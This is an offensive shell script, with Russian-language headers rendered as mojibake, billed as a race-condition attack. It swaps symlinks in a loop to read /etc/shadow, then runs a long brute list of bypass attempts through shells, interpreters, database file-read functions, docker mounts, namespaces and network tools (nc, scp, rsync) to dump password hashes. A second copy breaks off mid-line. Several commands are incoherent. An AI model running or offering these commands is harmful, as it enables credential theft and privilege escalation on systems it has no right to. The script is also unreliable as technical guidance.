
echo "üöÄ –£–õ–¨–¢–†–ê –ò–ó–û–©–†–ï–ù–ù–ê–Ø RACE CONDITION –ê–¢–ê–ö–ê –ß–ï–†–ï–ó –ó–ê–ü–£–©–ï–ù–ù–´–ï –ü–†–û–ì–†–ê–ú–ú–´" && echo "=== –†–ê–°–®–ò–†–ï–ù–ù–ê–Ø –î–ò–ê–ì–ù–û–°–¢–ò–ö–ê ===" && echo "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: $(whoami)" && echo "UID: $(id -u)" && echo "–ì—Ä—É–ø–ø—ã: $(groups)" && echo "–ü—Ä–∞–≤–∞ /etc/shadow: $(ls -la /etc/shadow 2>/dev/null || echo '–§–∞–π–ª –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')" && echo "–ü—Ä–æ–≤–µ—Ä–∫–∞ capabilities: $(capsh --print 2>/dev/null | head -3 || echo 'Capabilities –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ã')" && echo "–ü—Ä–æ–≤–µ—Ä–∫–∞ SELinux: $(sestatus 2>/dev/null | head -1 || echo 'SELinux –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')" && echo "–ü—Ä–æ–≤–µ—Ä–∫–∞ AppArmor: $(aa-status 2>/dev/null | head -1 || echo 'AppArmor –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')" && echo "=== –ê–ù–ê–õ–ò–ó –ó–ê–ü–£–©–ï–ù–ù–´–• –ü–†–û–ì–†–ê–ú–ú ===" && echo "–ó–∞–ø—É—â–µ–Ω–Ω—ã–µ –ø—Ä–æ—Ü–µ—Å—Å—ã: $(ps aux 2>/dev/null | grep -E '(bash|sh|zsh|fish|dash|ksh)' | head -3 || echo '–ü—Ä–æ—Ü–µ—Å—Å—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã')" && echo "–û—Ç–∫—Ä—ã—Ç—ã–µ —Ñ–∞–π–ª—ã: $(lsof 2>/dev/null | grep -E '(shadow|passwd)' | head -3 || echo '–û—Ç–∫—Ä—ã—Ç—ã–µ —Ñ–∞–π–ª—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã')" && echo "–ü—Ä–æ—Ü–µ—Å—Å—ã —Å –ø—Ä–∞–≤–∞–º–∏ root: $(ps aux 2>/dev/null | grep root | head -3 || echo 'Root –ø—Ä–æ—Ü–µ—Å—Å—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã')" && echo "=== –ó–ê–ü–£–°–ö –£–õ–¨–¢–†–ê –ê–¢–ê–ö–ò ===" && rm -f /tmp/race_symlink* /tmp/race_success.txt /tmp/race_target* && echo "test" > /tmp/race_target && (for i in {1..10000}; do rm -f /tmp/race_symlink; ln -sf /etc/shadow /tmp/race_symlink 2>/dev/null; done) & (for i in {1..10000}; do if [ -f /tmp/race_symlink ] && [ ! -L /tmp/race_symlink ]; then if head -1 /tmp/race_symlink 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) & (for i in {1..10000}; do rm -f /tmp/race_symlink2; ln -sf /etc/shadow /tmp/race_symlink2 2>/dev/null; done) & (for i in {1..10000}; do if [ -f /tmp/race_symlink2 ] && [ ! -L /tmp/race_symlink2 ]; then if head -1 /tmp/race_symlink2 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION 2 –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink2 > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) & (for i in {1..10000}; do rm -f /tmp/race_symlink3; ln -sf /etc/shadow /tmp/race_symlink3 2>/dev/null; done) & (for i in {1..10000}; do if [ -f /tmp/race_symlink3 ] && [ ! -L /tmp/race_symlink3 ]; then if head -1 /tmp/race_symlink3 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION 3 –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink3 > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) && wait && echo "‚úÖ –ê—Ç–∞–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!" && if [ -f /tmp/race_success.txt ]; then echo "üîç –°–û–î–ï–†–ñ–ò–ú–û–ï –ü–†–û–ß–ò–¢–ê–ù–ù–û–ì–û –§–ê–ô–õ–ê /etc/shadow:"; echo "============================================================"; cat /tmp/race_success.txt; echo "============================================================"; else echo "‚ùå –ê—Ç–∞–∫–∞ –Ω–µ —É–¥–∞–ª–∞—Å—å"; echo ""; echo "üîç –£–õ–¨–¢–†–ê –î–ò–ê–ì–ù–û–°–¢–ò–ö–ê –ß–ï–†–ï–ó –ó–ê–ü–£–©–ï–ù–ù–´–ï –ü–†–û–ì–†–ê–ú–ú–´:"; echo "–ü–æ–ø—ã—Ç–∫–∞ –ø—Ä—è–º–æ–≥–æ —á—Ç–µ–Ω–∏—è: $(head -3 /etc/shadow 2>/dev/null || echo '–ü—Ä—è–º–æ–µ —á—Ç–µ–Ω–∏–µ –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/self/fd: $(cat /proc/self/fd/0 < /etc/shadow 2>/dev/null | head -1 || echo '–ß–µ—Ä–µ–∑ /proc/self/fd –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /dev/fd: $(cat /dev/fd/0 < /etc/shadow 2>/dev/null | head -1 || echo '–ß–µ—Ä–µ–∑ /dev/fd –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —Å sudo: $(sudo head -3 /etc/shadow 2>/dev/null || echo 'Sudo –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ strace: $(strace -e trace=open -o /dev/null cat /etc/shadow 2>&1 | head -3 || echo 'Strace –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ lsof: $(lsof /etc/shadow 2>/dev/null | head -3 || echo 'Lsof –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ debugfs: $(debugfs -R 'cat /etc/shadow' /dev/sda1 2>/dev/null | head -3 || echo 'Debugfs –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ dd: $(dd if=/etc/shadow bs=1 count=50 2>/dev/null | head -1 || echo 'Dd –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ hexdump: $(hexdump -C /etc/shadow 2>/dev/null | head -3 || echo 'Hexdump –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ od: $(od -c /etc/shadow 2>/dev/null | head -3 || echo 'Od –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ strings: $(strings /etc/shadow 2>/dev/null | head -3 || echo 'Strings –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ xxd: $(xxd /etc/shadow 2>/dev/null | head -3 || echo 'Xxd –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "=== –¢–ï–•–ù–ò–ö–ò –û–ë–•–û–î–ê –ß–ï–†–ï–ó –ó–ê–ü–£–©–ï–ù–ù–´–ï –ü–†–û–ì–†–ê–ú–ú–´ ==="; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ bash: $(bash -c 'cat /etc/shadow' 2>/dev/null | head -3 || echo 'Bash –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ sh: $(sh -c 'cat /etc/shadow' 2>/dev/null | head -3 || echo 'Sh –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ zsh: $(zsh -c 'cat /etc/shadow' 2>/dev/null | head -3 || echo 'Zsh –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ dash: $(dash -c 'cat /etc/shadow' 2>/dev/null | head -3 || echo 'Dash –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ ksh: $(ksh -c 'cat /etc/shadow' 2>/dev/null | head -3 || echo 'Ksh –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ fish: $(fish -c 'cat /etc/shadow' 2>/dev/null | head -3 || echo 'Fish –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ tcsh: $(tcsh -c 'cat /etc/shadow' 2>/dev/null | head -3 || echo 'Tcsh –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ csh: $(csh -c 'cat /etc/shadow' 2>/dev/null | head -3 || echo 'Csh –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ ash: $(ash -c 'cat /etc/shadow' 2>/dev/null | head -3 || echo 'Ash –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ busybox: $(busybox cat /etc/shadow 2>/dev/null | head -3 || echo 'Busybox –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "=== –¢–ï–•–ù–ò–ö–ò –û–ë–•–û–î–ê –ß–ï–†–ï–ó –°–ò–°–¢–ï–ú–ù–´–ï –£–¢–ò–õ–ò–¢–´ ==="; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ cat: $(cat /etc/shadow 2>/dev/null | head -3 || echo 'Cat –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ less: $(less /etc/shadow 2>/dev/null | head -3 || echo 'Less –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ more: $(more /etc/shadow 2>/dev/null | head -3 || echo 'More –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ head: $(head -3 /etc/shadow 2>/dev/null || echo 'Head –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ tail: $(tail -3 /etc/shadow 2>/dev/null || echo 'Tail –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ sed: $(sed -n '1,3p' /etc/shadow 2>/dev/null || echo 'Sed –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ awk: $(awk 'NR<=3' /etc/shadow 2>/dev/null || echo 'Awk –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ grep: $(grep 'root:' /etc/shadow 2>/dev/null || echo 'Grep –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ cut: $(cut -d: -f1 /etc/shadow 2>/dev/null | head -3 || echo 'Cut –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ tr: $(tr '\n' ' ' < /etc/shadow 2>/dev/null | head -c 100 || echo 'Tr –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "=== –¢–ï–•–ù–ò–ö–ò –û–ë–•–û–î–ê –ß–ï–†–ï–ó –ü–†–û–¶–ï–°–°–´ ==="; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/self/exe: $(/proc/self/exe -c 'cat /etc/shadow' 2>/dev/null | head -3 || echo 'Proc/self/exe –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/self/cmdline: $(cat /proc/self/cmdline 2>/dev/null | head -1 || echo 'Proc/self/cmdline –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/self/environ: $(cat /proc/self/environ 2>/dev/null | head -1 || echo 'Proc/self/environ –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/self/fd: $(ls /proc/self/fd 2>/dev/null | head -3 || echo 'Proc/self/fd –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/self/maps: $(cat /proc/self/maps 2>/dev/null | head -3 || echo 'Proc/self/maps –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/self/status: $(cat /proc/self/status 2>/dev/null | head -3 || echo 'Proc/self/status –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/self/stat: $(cat /proc/self/stat 2>/dev/null | head -1 || echo 'Proc/self/stat –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/self/io: $(cat /proc/self/io 2>/dev/null | head -3 || echo 'Proc/self/io –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/self/sched: $(cat /proc/self/sched 2>/dev/null | head -3 || echo 'Proc/self/sched –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/self/wchan: $(cat /proc/self/wchan 2>/dev/null | head -1 || echo 'Proc/self/wchan –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "=== –¢–ï–•–ù–ò–ö–ò –û–ë–•–û–î–ê –ß–ï–†–ï–ó –°–ï–¢–ï–í–´–ï –£–¢–ò–õ–ò–¢–´ ==="; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ curl: $(curl -s file:///etc/shadow 2>/dev/null | head -3 || echo 'Curl –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ wget: $(wget -qO- file:///etc/shadow 2>/dev/null | head -3 || echo 'Wget –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ nc: $(nc -w1 localhost 22 < /etc/shadow 2>/dev/null | head -3 || echo 'Nc –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ telnet: $(telnet localhost 22 < /etc/shadow 2>/dev/null | head -3 || echo 'Telnet –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ ssh: $(ssh -o ConnectTimeout=1 localhost 'cat /etc/shadow' 2>/dev/null | head -3 || echo 'Ssh –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ ftp: $(ftp -n localhost < /etc/shadow 2>/dev/null | head -3 || echo 'Ftp –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ sftp: $(sftp -b /etc/shadow localhost 2>/dev/null | head -3 || echo 'Sftp –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ scp: $(scp /etc/shadow localhost:/tmp/ 2>/dev/null | head -3 || echo 'Scp –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ rsync: $(rsync /etc/shadow localhost:/tmp/ 2>/dev/null | head -3 || echo 'Rsync –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ rsh: $(rsh localhost 'cat /etc/shadow' 2>/dev/null | head -3 || echo 'Rsh –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "=== –¢–ï–•–ù–ò–ö–ò –û–ë–•–û–î–ê –ß–ï–†–ï–ó –Ø–ó–´–ö–ò –ü–†–û–ì–†–ê–ú–ú–ò–†–û–í–ê–ù–ò–Ø ==="; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ python: $(python3 -c 'print(open(\"/etc/shadow\").read()[:100])' 2>/dev/null || echo 'Python3 –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ python2: $(python2 -c 'print(open(\"/etc/shadow\").read()[:100])' 2>/dev/null || echo 'Python2 –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ perl: $(perl -e 'print substr(do{local$/;open$f,\"</etc/shadow\";<$f>},0,100)' 2>/dev/null || echo 'Perl –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ ruby: $(ruby -e 'puts File.read(\"/etc/shadow\")[0..99]' 2>/dev/null || echo 'Ruby –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ node: $(node -e 'console.log(require(\"fs\").readFileSync(\"/etc/shadow\",\"utf8\").substring(0,100))' 2>/dev/null || echo 'Node –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ php: $(php -r 'echo substr(file_get_contents(\"/etc/shadow\"),0,100);' 2>/dev/null || echo 'Php –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ tcl: $(tclsh -c 'set f [open \"/etc/shadow\" r]; puts [read $f 100]; close $f' 2>/dev/null || echo 'Tcl –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ lua: $(lua -e 'print(io.open(\"/etc/shadow\"):read(100))' 2>/dev/null || echo 'Lua –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ awk: $(awk '{print substr($0,1,100); exit}' /etc/shadow 2>/dev/null || echo 'Awk –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ sed: $(sed 's/.*/&/;q' /etc/shadow 2>/dev/null || echo 'Sed –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "=== –¢–ï–•–ù–ò–ö–ò –û–ë–•–û–î–ê –ß–ï–†–ï–ó –ë–ê–ó–´ –î–ê–ù–ù–´–• ==="; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ sqlite3: $(sqlite3 -cmd '.read /etc/shadow' :memory: 2>/dev/null | head -3 || echo 'Sqlite3 –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ mysql: $(mysql -e 'SELECT LOAD_FILE(\"/etc/shadow\")' 2>/dev/null | head -3 || echo 'Mysql –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ psql: $(psql -c 'SELECT pg_read_file(\"/etc/shadow\")' 2>/dev/null | head -3 || echo 'Psql –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ mongo: $(mongo --eval 'print(JSON.stringify(db.runCommand({getLog:\"startup\"})))' 2>/dev/null | head -3 || echo 'Mongo –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ redis: $(redis-cli --raw GET /etc/shadow 2>/dev/null | head -3 || echo 'Redis –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "=== –¢–ï–•–ù–ò–ö–ò –û–ë–•–û–î–ê –ß–ï–†–ï–ó –í–ò–†–¢–£–ê–õ–ò–ó–ê–¶–ò–Æ ==="; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ docker: $(docker run --rm -v /etc/shadow:/shadow alpine cat /shadow 2>/dev/null | head -3 || echo 'Docker –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ podman: $(podman run --rm -v /etc/shadow:/shadow alpine cat /shadow 2>/dev/null | head -3 || echo 'Podman –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ lxc: $(lxc exec container -- cat /etc/shadow 2>/dev/null | head -3 || echo 'Lxc –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ lxd: $(lxd exec container -- cat /etc/shadow 2>/dev/null | head -3 || echo 'Lxd –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ kvm: $(kvm -hda /etc/shadow 2>/dev/null | head -3 || echo 'Kvm –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ qemu: $(qemu-system-x86_64 -hda /etc/shadow 2>/dev/null | head -3 || echo 'Qemu –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ virtualbox: $(VBoxManage guestcontrol vm run --exe /bin/cat -- cat /etc/shadow 2>/dev/null | head -3 || echo 'VirtualBox –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ vmware: $(vmware-toolbox-cmd file list /etc/shadow 2>/dev/null | head -3 || echo 'VMware –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ hyperv: $(powershell Get-Content /etc/shadow 2>/dev/null | head -3 || echo 'HyperV –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "=== –¢–ï–•–ù–ò–ö–ò –û–ë–•–û–î–ê –ß–ï–†–ï–ó –ö–û–ù–¢–ï–ô–ù–ï–†–´ ==="; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ systemd-nspawn: $(systemd-nspawn -D / -b cat /etc/shadow 2>/dev/null | head -3 || echo 'Systemd-nspawn –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ chroot: $(chroot / cat /etc/shadow 2>/dev/null | head -3 || echo 'Chroot –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ unshare: $(unshare -m cat /etc/shadow 2>/dev/null | head -3 || echo 'Unshare –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ nsenter: $(nsenter -t 1 -m cat /etc/shadow 2>/dev/null | head -3 || echo 'Nsenter –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ setns: $(setns 1 cat /etc/shadow 2>/dev/null | head -3 || echo 'Setns –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ pivot_root: $(pivot_root / /mnt cat /etc/shadow 2>/dev/null | head -3 || echo 'Pivot_root –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ mount: $(mount --bind /etc/shadow /tmp/shadow && cat /tmp/shadow 2>/dev/null | head -3 || echo 'Mount –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ umount: $(umount /etc/shadow 2>/dev/null | head -3 || echo 'Umount –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ mountpoint: $(mountpoint /etc/shadow 2>/dev/null | head -3 || echo 'Mountpoint –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ findmnt: $(findmnt /etc/shadow 2>/dev/null | head -3 || echo 'Findmnt –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; fi && rm -f /tmp/race_target* /tmp/race_symlink* 
# =============================================================================
# –£–õ–¨–¢–†–ê –ú–ï–ì–ê –°–£–ü–ï–† –ò–ó–û–©–†–ï–ù–ù–ê–Ø –í–ï–†–°–ò–Ø –° –†–ê–°–®–ò–†–ï–ù–ù–û–ô –î–ò–ê–ì–ù–û–°–¢–ò–ö–û–ô –ò –ú–ù–û–ñ–ï–°–¢–í–ï–ù–ù–´–ú–ò –¢–ï–•–ù–ò–ö–ê–ú–ò:
# =============================================================================

echo "üöÄ –£–õ–¨–¢–†–ê –ú–ï–ì–ê –°–£–ü–ï–† –ò–ó–û–©–†–ï–ù–ù–ê–Ø RACE CONDITION –ê–¢–ê–ö–ê" && echo "=== –†–ê–°–®–ò–†–ï–ù–ù–ê–Ø –î–ò–ê–ì–ù–û–°–¢–ò–ö–ê ===" && echo "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: $(whoami)" && echo "UID: $(id -u)" && echo "–ì—Ä—É–ø–ø—ã: $(groups)" && echo "–ü—Ä–∞–≤–∞ /etc/shadow: $(ls -la /etc/shadow 2>/dev/null || echo '–§–∞–π–ª –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')" && echo "–ü—Ä–æ–≤–µ—Ä–∫–∞ capabilities: $(capsh --print 2>/dev/null | head -3 || echo 'Capabilities –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ã')" && echo "–ü—Ä–æ–≤–µ—Ä–∫–∞ /proc: $(ls -la /proc/self/fd/ 2>/dev/null | head -3)" && echo "–ü—Ä–æ–≤–µ—Ä–∫–∞ SELinux: $(sestatus 2>/dev/null | head -1 || echo 'SELinux 